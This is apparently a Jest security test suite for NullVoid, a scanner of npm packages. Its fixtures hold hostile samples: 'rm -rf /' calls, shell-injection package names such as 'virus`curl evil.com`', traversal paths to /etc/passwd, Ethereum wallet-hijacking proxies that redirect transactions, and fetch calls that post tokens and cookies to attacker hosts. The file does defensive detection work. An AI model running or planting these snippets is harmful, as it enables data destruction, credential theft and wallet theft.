/**
 * Comprehensive Security Tests for NullVoid
 * Tests critical security features and vulnerability prevention
 */

const { describe, test, expect, beforeEach, afterEach } = require('@jest/globals');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Import security modules
const { 
  analyzeFileSafely, 
  analyzeWalletThreats, 
  createSecureSandbox,
  analyzeCodeInSandbox 
} = require('../../lib/sandbox');

const { 
  validatePath, 
  safeReadFile, 
  safeReadDir, 
  validatePackageName,
  PathTraversalError,
  CommandInjectionError
} = require('../../lib/pathSecurity');

const { 
  InputValidator, 
  SecurityError, 
  ValidationError,
  MaliciousCodeError,
  globalErrorHandler,
  safeExecute 
} = require('../../lib/secureErrorHandler');

const { ENHANCED_RULES, applyRules } = require('../../lib/rules');

describe('Security-Critical Tests', () => {
  let tempDir;
  
  beforeEach(() => {
    // Create temporary directory for tests
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nullvoid-security-test-'));
  });
  
  afterEach(() => {
    // Clean up temporary directory
    if (tempDir && fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('Sandbox Security', () => {
    test('should prevent malicious code execution', async () => {
      const maliciousCode = `
        const fs = require('fs');
        const child_process = require('child_process');
        fs.writeFileSync('/tmp/hacked.txt', 'I was here');
        child_process.exec('rm -rf /');
      `;
      
      const result = analyzeCodeInSandbox(maliciousCode, 'malicious.js');
      
      expect(result.safe).toBe(false);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats.some(t => t.type === 'MODULE_LOADING_ATTEMPT')).toBe(true);
    });
    
    test('should detect wallet hijacking attempts', async () => {
      const walletHijackCode = `
        const originalEthereum = window.ethereum;
        window.ethereum = new Proxy(originalEthereum, {
          get(target, prop) {
            if (prop === 'request') {
              return async (args) => {
                if (args.method === 'eth_sendTransaction') {
                  args.params[0].to = '0xATTACKER_ADDRESS';
                }
                return target.request(args);
              };
            }
            return target[prop];
          }
        });
      `;
      
      const threats = analyzeWalletThreats(walletHijackCode, 'wallet-hijack.js');
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('WALLET_ETHEREUM_HIJACK') || t.type.includes('WALLET_ETHEREUMHIJACK'))).toBe(true);
      expect(threats.some(t => t.severity === 'CRITICAL')).toBe(true);
    });
    
    test('should detect obfuscated wallet code', async () => {
      const obfuscatedCode = `
        eval(String.fromCharCode(119,105,110,100,111,119,46,101,116,104,101,114,101,117,109));
        const _0x1234 = ['ethereum', 'request', 'sendTransaction'];
        Function('return ' + _0x1234[0])();
      `;
      
      const threats = analyzeWalletThreats(obfuscatedCode, 'obfuscated.js');
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('OBFUSCATION'))).toBe(true);
    });
    
    test('should timeout long-running malicious code', async () => {
      const infiniteLoopCode = `
        // Create a more intensive loop that will definitely timeout
        let i = 0;
        while(true) {
          i++;
          // Add some computation to make it slower
          Math.random() * Math.random();
          if (i > 1000000) break; // Safety break, but should timeout before this
        }
        console.log('Loop completed');
      `;
      
      const result = analyzeCodeInSandbox(infiniteLoopCode, 'infinite.js');
      
      // The code should either timeout or be detected as suspicious
      // Check for any threats (timeout, module loading, etc.)
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats.some(t => 
        t.type === 'EXECUTION_TIMEOUT' || 
        t.type === 'TIMEOUT_EXCEEDED' ||
        t.type === 'MODULE_LOADING_ATTEMPT' ||
        t.type === 'CODE_GENERATION_ATTEMPT'
      )).toBe(true);
    });
  });

  describe('Path Security', () => {
    test('should prevent directory traversal attacks', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        'node_modules/../../../etc/passwd',
        'package.json/../../../etc/passwd'
      ];
      
      maliciousPaths.forEach(maliciousPath => {
        expect(() => {
          validatePath(maliciousPath, tempDir);
        }).toThrow(PathTraversalError);
      });
    });
    
    test('should allow legitimate file paths', () => {
      const legitimatePaths = [
        'package.json',
        'src/index.js',
        'lib/utils.js',
        'test/unit/test.js',
        'node_modules/lodash/index.js'
      ];
      
      legitimatePaths.forEach(legitimatePath => {
        expect(() => {
          validatePath(legitimatePath, tempDir);
        }).not.toThrow();
      });
    });
    
    test('should validate package names securely', () => {
      const maliciousPackageNames = [
        'malware; rm -rf /',
        'virus`curl evil.com`',
        'trojan$(wget evil.com)',
        'backdoor|cat /etc/passwd',
        'hack; eval("malicious code")',
        'crack$(exec("rm -rf /"))'
      ];
      
      maliciousPackageNames.forEach(maliciousName => {
        expect(() => {
          validatePackageName(maliciousName);
        }).toThrow(CommandInjectionError);
      });
    });
    
    test('should allow legitimate package names', () => {
      const legitimateNames = [
        'lodash',
        '@babel/core',
        'react',
        'express',
        'webpack',
        'jest'
      ];
      
      legitimateNames.forEach(legitimateName => {
        expect(() => {
          validatePackageName(legitimateName);
        }).not.toThrow();
      });
    });
  });

  describe('Input Validation', () => {
    test('should validate scan options securely', () => {
      const maliciousOptions = [
        { depth: '5; rm -rf /' },
        { workers: '2`curl evil.com`' },
        { output: 'json$(wget evil.com)' },
        { depth: -1 },
        { workers: 999 },
        { output: 'malicious' }
      ];
      
      maliciousOptions.forEach(maliciousOption => {
        expect(() => {
          InputValidator.validateScanOptions(maliciousOption);
        }).toThrow();
      });
    });
    
    test('should validate file content for malicious patterns', () => {
      const maliciousContent = [
        'eval("malicious code")',
        'new Function("return malicious code")',
        'require("fs").writeFileSync("/tmp/hack", "data")',
        'child_process.exec("rm -rf /")',
        'fetch("http://evil.com/steal-data")'
      ];
      
      maliciousContent.forEach(content => {
        expect(() => {
          InputValidator.validateFileContent(content, 'malicious.js');
        }).toThrow(MaliciousCodeError);
      });
    });
  });

  describe('Enhanced Rules System', () => {
    test('should detect sophisticated wallet hijacking', () => {
      const sophisticatedHijack = `
        // Sophisticated wallet hijacking
        Object.defineProperty(window, 'ethereum', {
          get() {
            return new Proxy(originalEthereum, {
              get(target, prop) {
                if (prop === 'request') {
                  return async (args) => {
                    if (args.method === 'eth_sendTransaction') {
                      // Redirect to attacker address
                      args.params[0].to = '0x742d35Cc6634C0532925a3b8D0C0C4C7c4C7c4C7';
                    }
                    return target.request(args);
                  };
                }
                return target[prop];
              }
            });
          }
        });
      `;
      
      const threats = applyRules(sophisticatedHijack, 'test-package', ENHANCED_RULES);
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('WALLET_HIJACKING'))).toBe(true);
      expect(threats.some(t => t.severity === 'CRITICAL')).toBe(true);
    });
    
    test('should detect multi-chain wallet attacks', () => {
      const multiChainAttack = `
        // Multi-chain wallet hijacking using actual patterns
        window.ethereum = new Proxy({}, {});
        Object.defineProperty(window, 'ethereum', {
          value: maliciousWallet
        });
        // Address replacement pattern
        const address = '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6';
        const newAddress = address.replace(/0x[a-fA-F0-9]{40}/, '0xAttackerAddress');
      `;
      
      const threats = applyRules(multiChainAttack, 'test-package', ENHANCED_RULES);
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => 
        t.type.includes('WALLET_HIJACKING') || 
        t.type.includes('ENHANCED_RULE') ||
        t.type.includes('AGGREGATE')
      )).toBe(true);
    });
    
    test('should detect supply chain attacks', () => {
      const supplyChainAttack = `
        // Supply chain attack patterns
        const packageName = 'lodash-typo-squatting';
        const registryUrl = 'https://registry.npmjs.org/malicious-package';
        const versionBump = '1.0.0 -> 1.0.1-malicious';
        
        // Package hijacking attempt
        const hijackedPackage = {
          name: 'legitimate-package',
          version: '1.0.1',
          malicious: true
        };
      `;
      
      const threats = applyRules(supplyChainAttack, 'test-package', ENHANCED_RULES);
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('SUPPLY_CHAIN_ATTACK'))).toBe(true);
    });
    
    test('should detect data exfiltration attempts', () => {
      const dataExfiltration = `
        // Data exfiltration patterns
        const sensitiveData = {
          apiKeys: process.env.API_KEY,
          tokens: localStorage.getItem('authToken'),
          cookies: document.cookie,
          userData: sessionStorage.getItem('userInfo')
        };
        
        // Send data to attacker server
        fetch('https://attacker-server.com/collect', {
          method: 'POST',
          body: JSON.stringify(sensitiveData)
        });
      `;
      
      const threats = applyRules(dataExfiltration, 'test-package', ENHANCED_RULES);
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('DATA_EXFILTRATION'))).toBe(true);
    });
  });

  describe('Error Handling', () => {
    test('should handle security errors gracefully', async () => {
      const result = await safeExecute(() => {
        throw new SecurityError('Test security error', 'TEST_ERROR');
      }, 'test-context', { throwOnError: false });
      
      expect(result).toBeNull();
    });
    
    test('should log errors appropriately', () => {
      const testError = new SecurityError('Test error', 'TEST_ERROR');
      
      expect(() => {
        globalErrorHandler.handleError(testError, 'TEST_ERROR');
      }).not.toThrow();
    });
  });

  describe('Integration Tests', () => {
    test('should perform end-to-end secure scan', async () => {
      // Create test files
      const maliciousFile = path.join(tempDir, 'malicious.js');
      const legitimateFile = path.join(tempDir, 'legitimate.js');
      
      fs.writeFileSync(maliciousFile, `
        // Malicious file
        eval("malicious code");
        require('fs').writeFileSync('/tmp/hack', 'data');
      `);
      
      fs.writeFileSync(legitimateFile, `
        // Simple legitimate file
        console.log('Hello World');
        const x = 1 + 2;
      `);
      
      // Test malicious file
      const maliciousResult = analyzeFileSafely(maliciousFile);
      expect(maliciousResult.safe).toBe(false);
      expect(maliciousResult.threats.length).toBeGreaterThan(0);
      
      // Test legitimate file
      const legitimateResult = analyzeFileSafely(legitimateFile);
      expect(legitimateResult.safe).toBe(true);
      expect(legitimateResult.threats.length).toBe(0);
    });
    
    test('should handle mixed threat scenarios', () => {
      const mixedThreatCode = `
        // Mixed threats: wallet hijacking + obfuscation + data exfiltration
        const _0x1234 = ['ethereum', 'request', 'sendTransaction'];
        
        // Wallet hijacking using actual patterns
        window.ethereum = new Proxy({}, {});
        eval(String.fromCharCode(97, 108, 101, 114, 116));
        
        // Data exfiltration
        const userData = {
          wallet: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
          balance: '1000000000000000000'
        };
        
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(userData)
        });
      `;
      
      const threats = analyzeWalletThreats(mixedThreatCode, 'mixed-threats.js');
      
      expect(threats.length).toBeGreaterThan(0);
      expect(threats.some(t => t.type.includes('WALLET'))).toBe(true);
      expect(threats.some(t => t.type.includes('OBFUSCATION') || t.type.includes('OBFUSCATED'))).toBe(true);
    });
  });
});

describe('Performance and Reliability Tests', () => {
  test('should handle large files efficiently', async () => {
    const largeContent = 'console.log("test");\n'.repeat(10000);
    const tempFile = path.join(os.tmpdir(), 'large-test.js');
    
    fs.writeFileSync(tempFile, largeContent);
    
    const startTime = Date.now();
    const result = analyzeFileSafely(tempFile);
    const endTime = Date.now();
    
    expect(result.safe).toBe(true);
    expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
    
    fs.unlinkSync(tempFile);
  });
  
  test('should handle concurrent scans safely', async () => {
    const promises = [];
    
    for (let i = 0; i < 10; i++) {
      promises.push(
        analyzeCodeInSandbox(`console.log("test ${i}");`, `test-${i}.js`)
      );
    }
    
    const results = await Promise.all(promises);
    
    expect(results.length).toBe(10);
    results.forEach(result => {
      expect(result.safe).toBe(true);
    });
  });
});
